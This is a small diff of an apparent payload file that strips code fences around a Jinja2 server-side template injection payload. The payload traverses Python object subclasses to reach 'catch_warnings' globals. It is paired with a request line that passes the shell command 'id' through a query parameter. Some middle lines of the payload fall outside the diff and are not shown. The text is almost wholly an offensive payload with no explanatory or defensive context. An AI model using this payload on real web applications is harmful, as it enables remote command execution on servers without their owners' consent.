@@ -1,7 +1,7 @@
-```
+
 GET /?q5ca=id
-```
-```
+
+
 {% for c in [1].__class__.__mro__[1].__subclasses__() %} 
     {% if c.__name__ == 'catch_warnings' %}
         {% for b in c.__init__.__globals__.values() %} 
@@ -13,4 +13,3 @@ GET /?q5ca=id
         {% endfor %}
     {% endif %}
 {% endfor %}
-```
